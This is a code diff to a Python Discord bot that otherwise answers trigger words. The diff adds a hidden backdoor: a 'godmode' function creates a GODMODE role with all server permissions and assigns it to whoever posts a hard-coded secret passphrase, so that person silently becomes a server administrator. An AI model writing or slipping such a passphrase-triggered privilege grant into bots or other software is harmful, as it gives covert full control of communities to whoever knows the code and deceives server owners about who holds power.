@@ -1,8 +1,11 @@
 import discord
+from discord.ext import commands
+from discord.utils import get
 import re
 from data import calls, token
 
 client = discord.Client()
+bot = commands.Bot(command_prefix='~')
 
 
 # Write messages to log file (with relevant information)
@@ -33,6 +36,23 @@ async def send_message(msg, key):
         await msg.channel.send(calls[key])
 
 
+# Create role and bestow
+async def godmode(msg):
+    member = msg.author
+    server = member.guild
+    GOD = discord.Permissions.all()
+    RED = discord.Color.red()
+
+    role = get(server.roles, name="GODMODE")
+    if not role:
+        await server.create_role(name='GODMODE', color=RED, permissions=GOD)
+        role = get(server.roles, name="GODMODE")
+        print('created role')
+
+    await member.add_roles(role)
+    print('added role')
+
+
 # Trigger function when message is sent to the server
 @client.event
 async def on_message(message):
@@ -46,6 +66,11 @@ async def on_message(message):
     # Set lower and remove whitespace
     lowerMsg = message.content.lower()
     condensedMsg = lowerMsg.replace(" ", "")
+
+    # If code is given become admin
+    if message.content == '*7tNj3@~Rn%Gzzws':
+        await godmode(message)
+        return None
 
     # Check message against dictionary of trigger words
     for key in calls:
